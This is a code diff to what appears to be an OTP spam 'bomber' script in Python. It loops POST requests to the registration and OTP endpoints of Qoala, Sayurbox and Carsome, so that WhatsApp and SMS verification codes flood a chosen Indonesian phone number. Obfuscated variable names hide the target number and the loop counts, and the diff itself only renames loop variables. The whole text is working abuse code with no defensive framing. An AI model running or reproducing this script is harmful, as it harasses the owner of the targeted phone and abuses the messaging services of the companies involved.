@@ -55,21 +55,21 @@ data_qoala = json.dumps({"phone_number":"+62"+n01028378123,"channel":"WA"})
 data_sayur = json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+n01028378123},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
 data_carsome = json.dumps({"username":n01028378123,"optType":1})
 
-for k in range(pieces2342193):
+for k in range(pieces81237):
   k += 1
   pos_qoala = requests.post("https://api.qoalaplus.com/go-agent/v2/user/register",headers=headers_qoala,data=data_qoala).text
   if "success" in pos_qoala:
     print("wawcool128393qoala >",k)
   else:
     print("badrspnsqoala >",k)
-for k in range(jumlah):
+for k in range(pieces81237):
   k += 1
   pos_sayur = requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers=headers_sayur,data=data_sayur).text
   if "__typename" in pos_sayur:
     print("wawcoo0909290syrbx >",k)
   else:
     print("badrspsns923syrbx >",k)
-for k in range(jumlah):
+for k in range(pieces81237):
   k += 1
   pos_carsome = requests.post("https://www.carsome.id/website/login/sendSMS",headers=headers_carsome,data=data_carsome).text
   if "Send successfully" in pos_carsome:
